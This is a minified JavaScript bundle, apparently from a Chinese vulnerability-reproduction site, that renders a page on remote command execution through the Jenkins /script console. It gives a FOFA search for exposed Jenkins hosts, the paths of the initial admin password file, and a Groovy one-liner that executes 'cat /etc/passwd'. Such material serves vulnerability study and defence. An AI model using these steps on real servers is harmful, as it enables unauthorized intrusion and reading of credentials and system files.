(window.webpackJsonp=window.webpackJsonp||[]).push([[445],{2239:function(s,a,t){s.exports=t.p+"assets/img/1629510961976-6518a8a9-cd7d-46b0-9bc5-67c07a1f9d7f.fd9a0567.png"},2733:function(s,a,t){"use strict";t.r(a);var e=t(75),n=Object(e.a)({},(function(){var s=this,a=s.$createElement,e=s._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"jenkins-script-远程命令执行漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#jenkins-script-远程命令执行漏洞"}},[s._v("#")]),s._v(" Jenkins script 远程命令执行漏洞")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("Jenkins 登录后访问 /script 页面，其中存在命令执行漏洞，当存在未授权的情况时导致服务器被入侵")]),s._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("Jenkins")]),e("br"),s._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[e("a-button",{attrs:{href:"https://fofa.info/result?qbase64=YXBwPSJKZW5raW5zIg%3D%3D"}},[s._v('app="Jenkins"')])],1),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("p",[s._v("账号密码存在于：")]),s._v(" "),e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[s._v("Linux: /var/lib/jenkins/secrets/initialAdminPassword\nWindows: C:"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Users"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("RabbitMask"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(".jenkins"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("secrets"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("initialAdminPassword\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[s._v("登录后台，或在未授权的情况下访问")]),s._v(" "),e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[s._v("http://xxx.xxx.xxx.xxx/script\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("在脚本命命令模块执行系统命令")]),s._v(" "),e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[s._v("println "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'cat /etc/passwd'")]),s._v(".execute"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".text\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:t(2239),alt:"image.png"}})])],1)}),[],!1,null,null,null);a.default=n.exports}}]);